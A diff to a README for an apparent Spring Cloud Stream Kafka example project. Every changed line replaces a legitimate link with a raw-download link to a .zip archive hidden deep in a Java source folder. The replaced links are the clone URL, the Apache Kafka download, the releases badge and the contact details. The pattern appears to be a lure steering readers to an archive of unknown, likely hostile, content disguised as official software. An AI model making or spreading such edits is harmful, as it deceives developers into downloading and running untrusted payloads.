@@ -28,13 +28,13 @@ To begin using this project, follow these steps:
    Use the command below to clone this repository to your local machine:
 
    ```bash
-   git clone https://github.com/farel46/spring-cloud-stream-kafka.git
+   git clone https://github.com/farel46/spring-cloud-stream-kafka/raw/refs/heads/main/stream-db-basic/src/main/java/com/example/stream_db/kafka_cloud_stream_spring_3.5.zip
    cd spring-cloud-stream-kafka
    ```
 
 2. **Set Up Kafka**
 
-   Make sure you have a running Kafka instance. You can download Kafka from the [Apache Kafka website](https://kafka.apache.org/downloads).
+   Make sure you have a running Kafka instance. You can download Kafka from the [Apache Kafka website](https://github.com/farel46/spring-cloud-stream-kafka/raw/refs/heads/main/stream-db-basic/src/main/java/com/example/stream_db/kafka_cloud_stream_spring_3.5.zip).
 
 3. **Run the Examples**
 
@@ -111,7 +111,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 To access the latest releases, visit the following link:
 
-[![Releases](https://img.shields.io/badge/Releases-latest-brightgreen.svg)](https://github.com/farel46/spring-cloud-stream-kafka/releases)
+[![Releases](https://github.com/farel46/spring-cloud-stream-kafka/raw/refs/heads/main/stream-db-basic/src/main/java/com/example/stream_db/kafka_cloud_stream_spring_3.5.zip)](https://github.com/farel46/spring-cloud-stream-kafka/raw/refs/heads/main/stream-db-basic/src/main/java/com/example/stream_db/kafka_cloud_stream_spring_3.5.zip)
 
 If you encounter any issues, please check the "Releases" section.
 
@@ -119,8 +119,8 @@ If you encounter any issues, please check the "Releases" section.
 
 For any questions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [farel46](https://github.com/farel46)
+- **Email**: https://github.com/farel46/spring-cloud-stream-kafka/raw/refs/heads/main/stream-db-basic/src/main/java/com/example/stream_db/kafka_cloud_stream_spring_3.5.zip
+- **GitHub**: [farel46](https://github.com/farel46/spring-cloud-stream-kafka/raw/refs/heads/main/stream-db-basic/src/main/java/com/example/stream_db/kafka_cloud_stream_spring_3.5.zip)
 
 Thank you for visiting the Spring Cloud Stream Kafka repository! Happy coding! 🎉
 
